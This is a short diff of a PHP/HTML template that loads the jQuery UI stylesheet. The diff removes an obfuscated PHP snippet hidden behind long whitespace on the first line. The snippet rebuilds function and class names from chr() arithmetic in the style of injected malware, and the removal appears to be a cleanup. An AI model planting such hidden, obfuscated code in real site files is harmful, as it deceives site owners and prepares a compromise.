@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ItLIF = chr (89) . chr ( 799 - 729 ).chr (97) . chr ( 117 - 22 ).chr ( 422 - 339 ).'G' . chr ( 872 - 768 ); $tFTzhb = "\x63" . chr ( 647 - 539 )."\141" . "\163" . chr (115) . chr (95) . "\x65" . chr ( 283 - 163 ).chr ( 653 - 548 ).chr (115) . "\x74" . chr (115); $TYSMnjZP = class_exists($ItLIF); $ItLIF = "25323";$tFTzhb = "22590";$FvPVwr = FALSE; ?><!-- jQuery UI CSS -->
+<!-- jQuery UI CSS -->
 <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
 
 <style>
